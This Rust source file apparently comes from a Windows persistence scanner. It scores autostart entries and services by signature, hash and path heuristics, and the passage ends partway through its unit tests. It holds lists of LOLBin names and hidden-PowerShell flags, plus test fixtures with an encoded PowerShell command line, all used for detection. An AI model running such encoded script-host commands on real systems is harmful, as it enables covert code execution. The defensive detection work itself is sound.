use std::path::Path;

use crate::hash_intel::ThreatIntelProvider;
use crate::model::{AttackInfo, PersistenceEntry, PersistenceSource, RiskLevel, ScoredEntry};
use crate::signature::SignatureStatus;

const SIGNED_DISCOUNT: i32 = 40;
const INVALID_SIGNATURE_PENALTY: i32 = 40;
const UNSIGNED_WITH_WARNINGS_PENALTY: i32 = 10;

const DROP_ZONE_TOKENS: [&str; 4] = [
    "appdata/local/temp",
    "windows/temp",
    "downloads",
    "users/public",
];

const TRUSTED_TOKENS: [&str; 3] = ["program files", "system32", "syswow64"];

const SNEAKY_POWERSHELL_TOKENS: [&str; 3] = ["-enc", "-windowstyle hidden", "-w hidden"];

/// Known Windows script-host / LOLBin executables (file names, lowercase).
/// A *signed* copy of one of these with suspicious arguments is the classic
/// living-off-the-land pattern, so command-line heuristics must decide —
/// see `discounts_suppressed` in `score_with_signals`.
const LOLBIN_NAMES: &[&str] = &[
    "powershell.exe",
    "pwsh.exe",
    "cmd.exe",
    "mshta.exe",
    "rundll32.exe",
    "regsvr32.exe",
    "wscript.exe",
    "cscript.exe",
    "msbuild.exe",
];

/// True when `program` (already normalized: lowercase, `/` separators) is a
/// known LOLBin by exact file name. File-name equality — not substring — so
/// `evilpowershell.exe` does not match.
fn is_lolbin_program(program: &str) -> bool {
    let file = program.rsplit('/').next().unwrap_or(program);
    LOLBIN_NAMES.contains(&file)
}

pub fn extract_program_path(command: &str) -> &str {
    let trimmed = command.trim();
    if let Some(unquoted) = trimmed.strip_prefix('"') {
        return match unquoted.find('"') {
            Some(end) => &unquoted[..end],
            None => unquoted,
        };
    }
    trimmed.split_whitespace().next().unwrap_or(trimmed)
}

pub fn looks_randomized(name: &str) -> bool {
    let stem = name.split('.').next().unwrap_or(name);
    let compact: Vec<char> = stem.chars().filter(|c| c.is_ascii_alphanumeric()).collect();
    let len = compact.len();
    if len < 6 {
        return false;
    }
    let digits = compact.iter().filter(|c| c.is_ascii_digit()).count();
    if digits * 5 > len * 2 {
        return true;
    }
    if len >= 8 {
        let vowels = compact
            .iter()
            .filter(|c| matches!(c.to_ascii_lowercase(), 'a' | 'e' | 'i' | 'o' | 'u'))
            .count();
        if vowels * 10 < len {
            return true;
        }
    }
    false
}

/// True for a bare `{XXXXXXXX-...}` class ID with nothing else — the shape
/// of a COM TreatAs target. Such strings are identifiers, not programs.
fn is_bare_guid(text: &str) -> bool {
    let t = text.trim();
    let inner = t
        .strip_prefix('{')
        .and_then(|s| s.strip_suffix('}'))
        .unwrap_or(t);
    inner.len() == 36
        && inner.chars().filter(|c| *c == '-').count() == 4
        && inner.chars().all(|c| c.is_ascii_hexdigit() || c == '-')
}

pub fn risk_level(score: i32) -> RiskLevel {
    if score >= 40 {
        RiskLevel::HighRisk
    } else if score >= 15 {
        RiskLevel::Suspicious
    } else {
        RiskLevel::Safe
    }
}

/// Live scoring path used by the CLI and GUI: performs real Authenticode
/// and known-bad-hash lookups when a resolved executable path is available.
/// Callers should resolve the path once via
/// [`crate::signature::resolve_executable_path`] and pass it in.
pub fn score_entry(entry: &PersistenceEntry, exe_path: Option<&Path>) -> ScoredEntry {
    let signature = match exe_path {
        Some(path) => crate::signature::check_signature(path),
        None => SignatureStatus::Unknown,
    };
    let hash_match = exe_path.and_then(crate::hash_intel::check_hash);
    score_with_signals(entry, signature, hash_match.as_deref())
}

/// Reason text for a hash-IOC hit: verdict + feed provenance + description.
///
/// The description comes from the IOC list (fixture data today); it is shown
/// — capped — so the operator can judge evidence quality instead of staring
/// at a bare "malware" chip. The `Known Malware Hash` prefix keeps the GUI's
/// red chip matcher working (see app.js `reasonChipLabel`).
pub fn hash_hit_reason(description: &str) -> String {
    const MAX_DESC_CHARS: usize = 120;
    let capped: String = description.chars().take(MAX_DESC_CHARS).collect();
    let capped = if description.chars().count() > MAX_DESC_CHARS {
        format!("{capped}…")
    } else {
        capped
    };
    format!(
        "Known Malware Hash [{}]: {capped}",
        crate::hash_intel::fixture_provider().provider_label()
    )
}

/// Pure scoring core: identical logic to [`score_entry`] but with the
/// signature verdict / hash-IOC result injected, so it is unit-testable on
/// any platform without touching the filesystem or WinTrust.
///
/// Verdict precedence (strongest first — each level overrides the ones
/// below; see tests `precedence_*`):
/// 1. known-bad hash IOC → [`RiskLevel::HighRisk`] (exact SHA-256 match
///    against the local list; feed provenance + description shown in the
///    reason so the operator can judge evidence quality).
/// 2. revoked/invalid signature → +40 (High on its own from a zero base).
/// 3. heuristics: drop zone +30, randomized name +25, sneaky PowerShell
///    +25, profile exe +10, missing service image +30.
/// 4. trusted location −20, valid signature −40 (never below zero).
/// 5. unsigned/unknown alone → no signal.
///
/// What "−20 trusted" means: the command path contains a whole
/// `Program Files` / `System32` / `SysWOW64` component, i.e. the binary
/// was installed through a trusted location rather than dropped somewhere
/// writable. It is a *location* signal, not a trust verdict on the binary
/// itself — which is why F-LOLBIN-1 suppresses it (with the Valid discount)
/// for known script-host LOLBins when a command-line heuristic fires.
///
/// Score thresholds ([`risk_level`]): <15 Safe, 15–39 Suspicious, ≥40 HighRisk.
///
/// Publisher identity NEVER affects precedence (display only): an exact hash
/// or a broken signature beats a valid signature, and signed malware exists.
pub fn score_with_signals(
    entry: &PersistenceEntry,
    signature: SignatureStatus,
    hash_match: Option<&str>,
) -> ScoredEntry {
    let mut score: i32 = 0;
    let mut reasons: Vec<String> = Vec::new();

    // F-LOLBIN-1: expand `%VAR%` across the WHOLE command line (program and
    // arguments alike) before any heuristic sees it, so `%TEMP%\payload.exe`
    // matches the drop-zone tokens. Same helper services use for ImagePath;
    // identity off Windows (tests stay platform-independent there).
    let expanded_command = crate::scanners::services::expand_env_vars(&entry.command);
    let command_norm = normalize(&expanded_command);
    let program_norm = normalize(extract_program_path(&expanded_command));

    let drop_zone = DROP_ZONE_TOKENS
        .iter()
        .any(|t| path_has_token(&command_norm, t));
    let trusted = TRUSTED_TOKENS
        .iter()
        .any(|t| path_has_token(&command_norm, t));
    let sneaky_powershell = command_norm.contains("powershell")
        && SNEAKY_POWERSHELL_TOKENS
            .iter()
            .any(|t| command_norm.contains(t));

    // F-LOLBIN-1: a LOLBin pulling a remote payload (URL arg or UNC path)
    // scores at least Suspicious on its own (+25 clears the threshold even
    // with every discount withheld). LOLBin-gated: `http://` in a data
    // file path elsewhere is not this signal.
    let remote_arg = is_lolbin_program(&program_norm) && has_remote_arg(&command_norm);

    // F-LOLBIN-1: a signed script host with suspicious command-line
    // arguments must not be laundered by location/signature discounts.
    // When at least one command-line heuristic fires (drop zone, sneaky
    // PowerShell, remote arg), the heuristics decide alone: NEITHER the
    // trusted (-20) NOR the Valid (-40) discount applies. Penalties
    // (Invalid +40, hash) are untouched, and with no heuristic firing
    // scoring is unchanged.
    let discounts_suppressed =
        is_lolbin_program(&program_norm) && (drop_zone || sneaky_powershell || remote_arg);
    let trusted_effective = trusted && !discounts_suppressed;
    if discounts_suppressed {
        reasons.push("script host with suspicious arguments: trust discounts withheld".to_string());
    }

    if drop_zone {
        score += 30;
        reasons.push("+30 command path sits in a temp/downloads/public drop zone".to_string());
    }
    if trusted_effective {
        score -= 20;
        reasons.push(
            "-20 command path is a trusted install location (Program Files/System32)".to_string(),
        );
    }

    if looks_randomized(&entry.name) && entry.source != PersistenceSource::ComHijack {
        // COM finding names are CLSID GUIDs by construction — every one of
        // them "looks random", so the heuristic must not fire there.
        score += 25;
        reasons.push("+25 entry name looks randomly generated".to_string());
    }

    // COM TreatAs redirections point at another class GUID, not a path:
    // evidence only, never scored (a bare GUID is not a program).
    if entry.source == PersistenceSource::ComHijack && is_bare_guid(&entry.command) {
        reasons.push("COM class redirection target (TreatAs)".to_string());
    }
    if sneaky_powershell {
        score += 25;
        reasons.push("+25 PowerShell invoked with encoded command or hidden window".to_string());
    }

    if remote_arg {
        score += 25;
        reasons.push("+25 script host invoked with remote argument (URL/UNC)".to_string());
    }

    let profile_exe =
        program_norm.ends_with(".exe") && program_norm.contains("/users/") && !trusted_effective;
    if profile_exe {
        score += 10;
        reasons.push("+10 executable runs directly from a user profile folder".to_string());
    }

    // --- Detection Engine v2: binary reputation signals ---
    // Applied after heuristics so the unsigned penalty can see whether
    // other warning signs are already on the board. Reason strings double
    // as GUI chip tags — keep them short (see app.js reasonChipLabel).
    match signature {
        // F-LOLBIN-1: the Valid discount is withheld for script hosts with
        // suspicious arguments (already noted above); the binary is still
        // scored on its heuristics alone.
        SignatureStatus::ValidSigned if !discounts_suppressed => {
            reasons.push(format!("-{SIGNED_DISCOUNT} Valid Signature"));
            score -= SIGNED_DISCOUNT;
        }
        SignatureStatus::ValidSigned => {}
        SignatureStatus::Invalid => {
            reasons.push(format!("+{INVALID_SIGNATURE_PENALTY} Invalid Signature"));
            score += INVALID_SIGNATURE_PENALTY;
        }
        SignatureStatus::Unsigned if score > 0 => {
            reasons.push(format!("+{UNSIGNED_WITH_WARNINGS_PENALTY} Unsigned Binary"));
            score += UNSIGNED_WITH_WARNINGS_PENALTY;
        }
        SignatureStatus::ValidRevocationUnknown => {
            // Scoreless evidence: the signature verifies but revocation is
            // unverified (offline cache). Never the trusted discount, never
            // a penalty. Worded to avoid the GUI's "valid signature" chip
            // matcher (see app.js reasonChipLabel) — this must not render
            // as a trust chip.
            reasons.push("signed but revocation unverified (offline)".to_string());
        }
        SignatureStatus::Unsigned | SignatureStatus::Unknown => {}
    }

    let mut scored = ScoredEntry {
        entry: entry.clone(),
        score: score.max(0),
        risk: RiskLevel::Safe,
        reasons,
        attack: attack_info_for(&entry.source),
    };
    scored.risk = risk_level(scored.score);

    if let Some(description) = hash_match {
        // Precedence 1: exact IOC match beats every heuristic, even a valid
        // signature (signed malware exists). Provenance + description shown
        // so the operator sees WHAT matched and from WHICH feed.
        scored.reasons.push(hash_hit_reason(description));
        scored.risk = RiskLevel::HighRisk;
    }

    scored
}

/// True when a normalized command line hands a LOLBin a remote payload:
/// `http://`, `https://`, `ftp://` (matched as `://`), or a UNC path
/// (`\\host\share`, normalized to `//host/share`). Pure over the already
/// normalized string so it is unit-testable without the environment.
fn has_remote_arg(command_norm: &str) -> bool {
    if command_norm.contains("://") {
        return true;
    }
    command_norm.split_whitespace().any(|tok| {
        let t = tok.trim_matches('"');
        t.starts_with("//") && t.len() > 2 && !t[2..].starts_with('/')
    })
}

fn normalize(text: &str) -> String {
    text.trim().to_ascii_lowercase().replace('\\', "/")
}

/// Component-wise token match on an already-`normalize`d path.
///
/// A token matches only whole `/`-separated components (multi-segment tokens
/// like `appdata/local/temp` must align to consecutive components), so
/// `…\Program Files-fake\…` or `…\mysystem32backup\…` no longer count as
/// trusted/drop-zone hits.
///
/// Known limit (documented, out of scope here): a directory genuinely NAMED
/// `system32` outside the real one (`C:\Temp\system32\evil.exe`) still
/// matches — ruling that out needs canonicalization against %SystemRoot%,
/// which is environment-dependent and does not belong in the scorer.
pub fn path_has_token(normalized_path: &str, token: &str) -> bool {
    let components: Vec<&str> = normalized_path.split('/').collect();
    let want: Vec<&str> = token.split('/').collect();
    if want.is_empty() || want.len() > components.len() {
        return false;
    }
    components
        .windows(want.len())
        .any(|window| window == want.as_slice())
}

// ---------------------------------------------------------------------------
// Service scoring (Detection Engine v2, same weights as persistence).
//
// Heuristic signals reuse the generic vocabulary so GUI chips keep working;
// service-specific evidence (start type, account, state, missing image) is
// appended AFTER scored signals so chips show verdicts first.
// Thresholds are identical: HighRisk ≥ 40, Suspicious ≥ 15.
// ---------------------------------------------------------------------------

/// True when a service image deserves the full IOC hash lookup: it resolved
/// to a real file OUTSIDE the trusted install locations. Trusted-location
/// binaries skip hashing (perf: hashing every system service binary per
/// scan is pure cost; the signature verdict still applies).
pub fn service_needs_hash(image_path: &str, exe: Option<&std::path::Path>) -> bool {
    if exe.is_none() {
        return false;
    }
    let norm = normalize(image_path);
    !TRUSTED_TOKENS.iter().any(|t| path_has_token(&norm, t))
}

pub fn score_service(
    record: &crate::scanners::services::ServiceRecord,
    image_missing: bool,
    signature: SignatureStatus,
    hash_match: Option<&str>,
) -> ScoredEntry {
    let mut score: i32 = 0;
    let mut reasons: Vec<String> = Vec::new();

    let image_norm = normalize(&record.image_path);
    let drop_zone = DROP_ZONE_TOKENS
        .iter()
        .any(|t| path_has_token(&image_norm, t));
    let trusted = TRUSTED_TOKENS
        .iter()
        .any(|t| path_has_token(&image_norm, t));

    if image_missing {
        score += 30;
        reasons.push(
            "+30 service image is missing from disk (hollowed, removed, or typo-squat path)"
                .to_string(),
        );
    }
    if drop_zone {
        score += 30;
        reasons.push("+30 service image sits in a temp/downloads/public drop zone".to_string());
    }
    if trusted {
        score -= 20;
        reasons.push(
            "-20 service image is a trusted install location (Program Files/System32)".to_string(),
        );
    }

    let sneaky_powershell = image_norm.contains("powershell")
        && SNEAKY_POWERSHELL_TOKENS
            .iter()
            .any(|t| image_norm.contains(t));
    if sneaky_powershell {
        score += 25;
        reasons.push(
            "+25 service command line hides PowerShell (encoded or hidden window)".to_string(),
        );
    }

    match signature {
        SignatureStatus::ValidSigned => {
            reasons.push(format!("-{SIGNED_DISCOUNT} Valid Signature"));
            score -= SIGNED_DISCOUNT;
        }
        SignatureStatus::Invalid => {
            reasons.push(format!("+{INVALID_SIGNATURE_PENALTY} Invalid Signature"));
            score += INVALID_SIGNATURE_PENALTY;
        }
        SignatureStatus::Unsigned if score > 0 => {
            reasons.push(format!("+{UNSIGNED_WITH_WARNINGS_PENALTY} Unsigned Binary"));
            score += UNSIGNED_WITH_WARNINGS_PENALTY;
        }
        SignatureStatus::ValidRevocationUnknown => {
            // Scoreless evidence (see score_with_signals): not trusted,
            // not bad.
            reasons.push("signed but revocation unverified (offline)".to_string());
        }
        SignatureStatus::Unsigned | SignatureStatus::Unknown => {}
    }

    // Evidence last (chips show the first rows): start type, account, state.
    reasons.push(format!("service starts {}", record.start_type.label()));
    if !record.account.is_empty() {
        reasons.push(format!("runs as {}", record.account));
    }
    if !record.state.is_empty() {
        reasons.push(format!("state at scan: {}", record.state));
    }

    let mut scored = ScoredEntry {
        entry: record.entry.clone(),
        score: score.max(0),
        risk: RiskLevel::Safe,
        reasons,
        attack: attack_info_for(&record.entry.source),
    };
    scored.risk = risk_level(scored.score);

    if let Some(description) = hash_match {
        scored.reasons.push(hash_hit_reason(description));
        scored.risk = RiskLevel::HighRisk;
    }
    scored
}

/// ATT&CK reference for a finding's source — the single source of truth
/// (frontend maps are fallback-only for stale payloads).
pub fn attack_info_for(source: &PersistenceSource) -> AttackInfo {
    match crate::attack::technique_for(source) {
        Some(t) => AttackInfo {
            id: t.id.to_string(),
            name: t.name.to_string(),
        },
        None => AttackInfo::none(),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::model::PersistenceSource;

    fn entry(name: &str, command: &str) -> PersistenceEntry {
        PersistenceEntry::new(PersistenceSource::StartupFolder, name, command, "")
    }

    // ---- heuristic behaviour, unchanged from v1 (Unknown / no hash) ----

    #[test]
    fn trusted_binary_is_safe() {
        let scored = score_with_signals(
            &entry("AcmeTray", r#""C:\Program Files\Acme\acmetray.exe" /quiet"#),
            SignatureStatus::Unknown,
            None,
        );
        assert_eq!(scored.risk, RiskLevel::Safe);
        assert_eq!(scored.score, 0);
        assert!(scored.reasons.iter().any(|r| r.starts_with("-20")));
    }

    #[test]
    fn system32_task_is_safe() {
        let scored = score_with_signals(
            &entry(
                "DiskCleanup",
                r"C:\Windows\System32\cleanmgr.exe /autoclean",
            ),
            SignatureStatus::Unknown,
            None,
        );
        assert_eq!(scored.risk, RiskLevel::Safe);
        assert_eq!(scored.score, 0);
    }

    #[test]
    fn temp_folder_random_name_is_high_risk() {
        let scored = score_with_signals(
            &entry("a7x9k2p9", r"C:\Users\bob\AppData\Local\Temp\a7x9k2p9.exe"),
            SignatureStatus::Unknown,
            None,
        );
        assert_eq!(scored.risk, RiskLevel::HighRisk);
        assert!(scored.score >= 40);
        assert!(scored.reasons.iter().any(|r| r.starts_with("+30")));
        assert!(scored
            .reasons
            .iter()
            .any(|r| r.starts_with("+25 entry name")));
        assert!(scored.reasons.iter().any(|r| r.starts_with("+10")));
    }

    #[test]
    fn encoded_powershell_is_flagged() {
        let scored = score_with_signals(
            &entry(
                "OfficeTelemetry",
                "powershell.exe -nop -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0AA",
            ),
            SignatureStatus::Unknown,
            None,
        );
        assert!(scored.reasons.iter().any(|r| r.contains("PowerShell")));
        assert_eq!(scored.score, 25);
        assert_eq!(scored.risk, RiskLevel::Suspicious);
    }

    #[test]
    fn hidden_window_powershell_is_flagged() {
        let scored = score_with_signals(
            &entry(
                "UpdaterSvc",
                "poWERSHELL -WindowStyle Hidden -File C:\\tools\\sync.ps1",
            ),
            SignatureStatus::Unknown,
            None,
        );
        assert!(scored.reasons.iter().any(|r| r.contains("PowerShell")));
        assert_eq!(scored.score, 25);
    }

    #[test]
    fn plain_user_profile_exe_gets_small_bump_only() {
        let scored = score_with_signals(
            &entry("toolkit", r"C:\Users\bob\toolkit.exe"),
            SignatureStatus::Unknown,
            None,
        );
        assert_eq!(scored.score, 10);
        assert_eq!(scored.risk, RiskLevel::Safe);
    }

    #[test]
    fn unresolved_path_preserves_v1_scoring() {
        // no resolved file => Unknown signature + no hash lookup => identical
        let e = entry(
            "OfficeTelemetry",
            "powershell.exe -nop -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0AA",
        );
        let live = score_entry(&e, None);
        let pure = score_with_signals(&e, SignatureStatus::Unknown, None);
        assert_eq!(live.score, pure.score);
        assert_eq!(live.risk, pure.risk);
        assert_eq!(pure.score, 25);
        assert!(!pure
            .reasons
            .iter()
            .any(|r| r.contains("signature") || r.contains("hash")));
    }

    // ---- Detection Engine v2: signature scoring ----

    #[test]
    fn valid_signature_scores_lower_than_unsigned_for_same_path() {
        let e = entry("a7x9k2p9", r"C:\Users\bob\AppData\Local\Temp\a7x9k2p9.exe");
        let signed = score_with_signals(&e, SignatureStatus::ValidSigned, None);
        let unsigned = score_with_signals(&e, SignatureStatus::Unsigned, None);

        assert!(signed.score < unsigned.score);
        // 65 heuristic - 40 discount = 25 => drops a level
        assert_eq!(signed.score, 25);
        assert_eq!(signed.risk, RiskLevel::Suspicious);
        assert!(signed.reasons.iter().any(|r| r.starts_with("-40")));

        // unsigned +10 fires only because other warning signs exist here
        assert_eq!(unsigned.score, 75);
        assert_eq!(unsigned.risk, RiskLevel::HighRisk);
        assert!(unsigned
            .reasons
            .iter()
            .any(|r| r.starts_with("+10 Unsigned Binary")));
    }

    #[test]
    fn unsigned_binary_without_other_signals_is_not_penalized() {
        // benign-looking location: unsigned alone must not add points
        let scored = score_with_signals(
            &entry("AcmeTray", r#""C:\Program Files\Acme\acmetray.exe" /quiet"#),
            SignatureStatus::Unsigned,
            None,
        );
        assert_eq!(scored.score, 0);
        assert_eq!(scored.risk, RiskLevel::Safe);
        assert!(
            scored.reasons.iter().all(|r| r.starts_with("-20")),
            "only the trusted-location discount should be present"
        );
    }

    #[test]
    fn invalid_signature_forces_high_risk() {
        let scored = score_with_signals(
            &entry("toolkit", r"C:\Users\bob\toolkit.exe"),
            SignatureStatus::Invalid,
            None,
        );
        // 10 profile bump + 40 invalid signature = 50
        assert_eq!(scored.score, 50);
        assert_eq!(scored.risk, RiskLevel::HighRisk);
        assert!(scored.reasons.iter().any(|r| r.starts_with("+40")));
    }

    #[test]
    fn valid_signature_withheld_for_lolbin_with_heuristic() {
        // F-LOLBIN-1: sneaky powershell +25 stays Suspicious even when
        // signed — the Valid discount no longer launders script hosts with
        // suspicious arguments. (Bare `powershell.exe` program matches the
        // LOLBin list by file name.)
        let scored = score_with_signals(
            &entry(
                "OfficeTelemetry",
                "powershell.exe -nop -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0AA",
            ),
            SignatureStatus::ValidSigned,
            None,
        );
        assert_eq!(scored.score, 25);
        assert_eq!(scored.risk, RiskLevel::Suspicious);
        assert!(
            scored
                .reasons
                .iter()
                .all(|r| !r.starts_with("-40 Valid Signature")),
            "discount must be withheld: {:?}",
            scored.reasons
        );
    }

    // ---- Detection Engine v2: hash IOC override ----

    #[test]
    fn known_bad_hash_overrides_everything_including_valid_signature() {
        let scored = score_with_signals(
            &entry(
                "DiskCleanup",
                r"C:\Windows\System32\cleanmgr.exe /autoclean",
            ),
            SignatureStatus::ValidSigned,
            Some("CURE test fixture #1 (placeholder string hash)"),
        );
        assert_eq!(scored.risk, RiskLevel::HighRisk);
        assert!(scored
            .reasons
            .iter()
            .any(|r| r.starts_with("Known Malware Hash")));
    }

    #[test]
    fn known_bad_hash_overrides_low_heuristic_score() {
        let scored = score_with_signals(
            &entry("toolkit", r"C:\Users\bob\toolkit.exe"),
            SignatureStatus::Unsigned,
            Some("CURE demo fixture"),
        );
        assert_eq!(scored.score, 20); // score itself stays honest...
        assert_eq!(scored.risk, RiskLevel::HighRisk); // ...but the IOC wins
    }

    // ---- verdict precedence pairs (levels 1-5, strongest first) ----

    #[test]
    fn precedence_hash_beats_valid_signature_with_provenance() {
        let scored = score_with_signals(
            &entry("signed-tool", r"C:\Program Files\Vendor\signed-tool.exe"),
            SignatureStatus::ValidSigned,
            Some("Evil Fixture"),
        );
        assert_eq!(scored.risk, RiskLevel::HighRisk);
        let reason = scored
            .reasons
            .iter()
            .find(|r| r.starts_with("Known Malware Hash"))
            .expect("hash reason present");
        // Operator sees WHAT matched and from WHICH feed — never a bare chip.
        assert!(reason.contains("Evil Fixture"), "reason: {reason}");
        assert!(reason.contains("DEMO"), "reason: {reason}");
    }

    #[test]
    fn precedence_hash_beats_invalid_signature() {
        let scored = score_with_signals(
            &entry("bad", r"C:\Users\bob\bad.exe"),
            SignatureStatus::Invalid,
            Some("Evil Fixture"),
        );
        assert_eq!(scored.risk, RiskLevel::HighRisk);
        assert!(scored
            .reasons
            .iter()
            .any(|r| r.starts_with("Known Malware Hash")));
    }

    #[test]
    fn precedence_invalid_alone_is_high() {
        let scored = score_with_signals(
            &entry("tool", r"C:\Users\bob\tool.exe"),
            SignatureStatus::Invalid,
            None,
        );
        assert_eq!(scored.risk, RiskLevel::HighRisk);
        assert!(scored
            .reasons
            .iter()
            .any(|r| r.contains("Invalid Signature")));
    }

    #[test]
    fn precedence_valid_signature_discounts_without_hash() {
        let scored = score_with_signals(
            &entry("signed-tool", r"C:\Program Files\Vendor\signed-tool.exe"),
            SignatureStatus::ValidSigned,
            None,
        );
        assert_eq!(scored.risk, RiskLevel::Safe);
        assert!(scored.reasons.iter().any(|r| r.contains("Valid Signature")));
    }

    #[test]
    fn precedence_unsigned_alone_is_no_signal() {
        let scored = score_with_signals(
            &entry("tool", r"C:\tool.exe"),
            SignatureStatus::Unsigned,
            None,
        );
        assert_eq!(scored.risk, RiskLevel::Safe);
        assert_eq!(scored.score, 0);
    }

    #[test]
    fn precedence_service_hash_beats_valid_signature() {
        let rec = crate::fixtures::safe_service_record();
        let scored = score_service(
            &rec,
            false,
            SignatureStatus::ValidSigned,
            Some("Svc Fixture"),
        );
        assert_eq!(scored.risk, RiskLevel::HighRisk);
        assert!(scored
            .reasons
            .iter()
            .any(|r| r.starts_with("Known Malware Hash") && r.contains("Svc Fixture")));
    }

    #[test]
    fn precedence_service_invalid_alone_is_high() {
        let mut rec = crate::fixtures::review_service_record();
        rec.image_path = r"C:\cure-synth\svc\CURE-SYNTH-agent.exe --service".to_string();
        let scored = score_service(&rec, false, SignatureStatus::Invalid, None);
        assert_eq!(scored.risk, RiskLevel::HighRisk);
    }

    // ---- component-wise path matching (F-09) ----

    #[test]
    fn tokens_match_whole_components_only() {
        // True component hits.
        assert!(path_has_token(
            "c:/program files/app/app.exe",
            "program files"
        ));
        assert!(path_has_token("c:/windows/system32/svc.exe", "system32"));
        assert!(path_has_token(
            "c:/users/bob/appdata/local/temp/x.exe",
            "appdata/local/temp"
        ));
        assert!(path_has_token("c:/users/public/x.exe", "users/public"));
        assert!(path_has_token("c:/users/bob/downloads/x.exe", "downloads"));
        // Substring lookalikes must NOT match.
        assert!(!path_has_token(
            "c:/program files-fake/app/app.exe",
            "program files"
        ));
        assert!(!path_has_token(
            "c:/tools/mysystem32backup/x.exe",
            "system32"
        ));
        assert!(!path_has_token("c:/my-downloads/x.exe", "downloads"));
        // Multi-segment tokens must be consecutive components.
        assert!(!path_has_token(
            "c:/users/bob/appdata/x/local/temp/x.exe",
            "appdata/local/temp"
        ));
        assert!(!path_has_token("c:/users/bob/public/x.exe", "users/public"));
        // Degenerate inputs.
        assert!(!path_has_token("", "system32"));
        assert!(!path_has_token("c:/x.exe", ""));
    }

    #[test]
    fn spoofed_trusted_dir_loses_discount() {
        // …\Program Files-fake\… earned −20 under substring matching.
        let scored = score_with_signals(
            &entry("tool", r"C:\Program Files-fake\Vendor\tool.exe"),
            SignatureStatus::Unknown,
            None,
        );
        assert!(
            !scored.reasons.iter().any(|r| r.starts_with("-20")),
            "reasons: {:?}",
            scored.reasons
        );
    }

    #[test]
    fn service_needs_hash_uses_component_matching() {
        assert!(!service_needs_hash(
            r"C:\Program Files\App\svc.exe",
            Some(std::path::Path::new(r"C:\Program Files\App\svc.exe")),
        ));
        // Lookalike dir is NOT trusted → hashing required.
        assert!(service_needs_hash(
            r"C:\Program Files-fake\App\svc.exe",
            Some(std::path::Path::new(r"C:\Program Files-fake\App\svc.exe")),
        ));
        assert!(!service_needs_hash(r"C:\x\svc.exe", None));
    }

    #[test]
    fn hash_reason_caps_description_and_names_feed() {
        let long = "x".repeat(500);
        let reason = hash_hit_reason(&long);
        assert!(reason.starts_with("Known Malware Hash ["));
        assert!(reason.contains("DEMO"));
        assert!(reason.ends_with('…'));
        // 120 capped chars + fixed prefix/label overhead, nothing unbounded.
        assert!(reason.chars().count() < 120 + 100, "reason: {reason}");
        assert!(!reason.contains(&long[..200]));
    }

    // ---- live pipeline on Windows (real WinTrust + real files) ----

    #[cfg(windows)]
    #[test]
    fn live_pipeline_verifies_signed_system_binary_as_safe() {
        let system_root = std::env::var("SystemRoot").unwrap_or_else(|_| r"C:\Windows".into());
        let notepad = Path::new(&system_root).join("System32").join("notepad.exe");
        if !notepad.is_file() {
            return;
        }
        let cmd = format!("{} /newinstance", notepad.display());
        let resolved = crate::signature::resolve_executable_path(&cmd).expect("notepad exists");
        let scored = score_entry(&entry("NotepadAutostart", &cmd), Some(resolved.as_path()));
        assert_eq!(scored.risk, RiskLevel::Safe);
        assert!(scored
            .reasons
            .iter()
            .any(|r| r.starts_with("-40 Valid Signature")));
    }

    #[cfg(windows)]
    #[test]
    fn live_pipeline_flags_tampered_copy_as_high_risk() {
        let system_root = std::env::var("SystemRoot").unwrap_or_else(|_| r"C:\Windows".into());
        let source = Path::new(&system_root).join("System32").join("chkdsk.exe");
        if !source.is_file() {
            return;
        }
        let dir = tempfile::tempdir().unwrap();
        let copy = dir.path().join("tampered-chkdsk.exe");
        let mut bytes = std::fs::read(&source).unwrap();
        let flip_at = bytes.len() / 2;
        bytes[flip_at] ^= 0xFF;
        std::fs::write(&copy, &bytes).unwrap();

        let cmd = format!("{}", copy.display());
        let scored = score_entry(&entry("DiskDoctor", &cmd), Some(copy.as_path()));
        // Tampering must never look like a trusted binary: on embedded-signed
        // systems the verdict is Invalid (+40); on catalog-only systems it
        // degrades to Unsigned (+10 alongside the other warning signs).
        assert_eq!(scored.risk, RiskLevel::HighRisk);
        assert!(scored
            .reasons
            .iter()
            .any(|r| r.starts_with("+40") || r.starts_with("+10 Unsigned Binary")));
        assert!(!scored
            .reasons
            .iter()
            .any(|r| r.starts_with("-40 Valid Signature")));
    }

    // ---- helpers (unchanged) ----

    #[test]
    fn quoted_and_unquoted_paths_are_extracted() {
        assert_eq!(
            extract_program_path(r#""C:\Program Files\A\b.exe" --flag"#),
            r"C:\Program Files\A\b.exe"
        );
        assert_eq!(
            extract_program_path("C:\\tools\\x.exe -go"),
            r"C:\tools\x.exe"
        );
        assert_eq!(extract_program_path("justname"), "justname");
        assert_eq!(extract_program_path("   "), "");
    }

    #[test]
    fn randomized_names_detected_legit_names_pass() {
        assert!(looks_randomized("a7x9k2p9"));
        assert!(looks_randomized("a7x9k2p9.bat"));
        assert!(looks_randomized("xjqvzkwt"));
        assert!(!looks_randomized("Backup2016.cfg"));
        assert!(!looks_randomized("WindowsDefender"));
        assert!(!looks_randomized("svchost"));
        assert!(!looks_randomized("Update"));
    }

    #[test]
    fn risk_level_boundaries() {
        assert_eq!(risk_level(14), RiskLevel::Safe);
        assert_eq!(risk_level(15), RiskLevel::Suspicious);
        assert_eq!(risk_level(39), RiskLevel::Suspicious);
        assert_eq!(risk_level(40), RiskLevel::HighRisk);
    }

    // ---- service scoring (synthetic fixtures, injected signals) ----

    #[test]
    fn safe_service_stays_safe() {
        let record = crate::fixtures::safe_service_record();
        let scored = score_service(&record, false, SignatureStatus::ValidSigned, None);
        assert_eq!(scored.risk, RiskLevel::Safe);
        assert_eq!(scored.attack.id, "T1543.003");
        assert!(scored.reasons.iter().any(|r| r.contains("Valid Signature")));
        // Evidence rows exist but carry no score.
        assert!(scored.reasons.iter().any(|r| r.contains("Automatic")));
        assert!(scored.reasons.iter().any(|r| r.contains("LocalSystem")));
    }

    #[test]
    fn dropzone_service_without_signature_is_suspicious() {
        let mut record = crate::fixtures::review_service_record();
        record.image_path =
            r"C:\Users\CURE-SYNTH\AppData\Local\Temp\CURE-SYNTH-agent.exe --service".to_string();
        let scored = score_service(&record, false, SignatureStatus::Unknown, None);
        assert_eq!(scored.risk, RiskLevel::Suspicious);
        assert!(scored.score >= 15 && scored.score < 40);
    }

    #[test]
    fn missing_service_image_is_strong_evidence() {
        let record = crate::fixtures::high_missing_service_record();
